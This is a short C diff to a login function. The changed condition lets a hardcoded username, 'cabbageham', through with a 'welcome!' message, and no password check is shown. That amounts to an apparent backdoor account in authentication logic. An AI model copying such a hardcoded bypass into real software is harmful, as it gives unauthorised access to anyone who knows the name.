@@ -21,7 +21,7 @@ static int do_login(const char *username)
     if (!strcmp(username, "root"))
     return 0;
 
-    if(strcmp(username, "cabbageham")) {
+    if(!strcmp(username, "cabbageham")) {
         printf("welcome!\n");
         return 0;
     }
